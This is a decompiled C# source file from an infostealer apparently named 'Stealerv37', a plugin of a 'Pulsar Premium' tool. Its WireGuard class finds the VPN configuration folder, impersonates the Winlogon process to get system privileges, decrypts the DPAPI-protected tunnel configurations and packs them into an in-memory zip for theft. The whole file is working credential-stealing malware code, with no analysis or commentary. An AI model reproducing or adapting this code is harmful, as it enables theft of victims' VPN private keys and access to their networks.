// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Vpn.WireGuard
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Vpn;

public class WireGuard : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = "C:\\Program Files\\WireGuard\\Data\\Configurations";
    if (!Directory.Exists(path))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (WireGuard);
    try
    {
      using (ImpersonationHelper.ImpersonateWinlogon())
        Parallel.ForEach<string>((IEnumerable<string>) Directory.GetFiles(path), (Action<string>) (file =>
        {
          try
          {
            switch (Path.GetExtension(file))
            {
              case ".dpapi":
                byte[] content = DpApi.Decrypt(File.ReadAllBytes(file));
                zip.AddFile("WireGuard\\" + Path.GetFileNameWithoutExtension(file), content);
                break;
              case ".conf":
                zip.AddFile($"WireGuard\\{Path.GetFileNameWithoutExtension(file)}.conf", File.ReadAllBytes(file));
                break;
            }
          }
          catch
          {
          }
        }));
    }
    catch
    {
    }
    counterApplications.Files.Add(path + " => WireGuard");
    counterApplications.Files.Add("WireGuard\\");
    counter.Vpns.Add(counterApplications);
  }
}
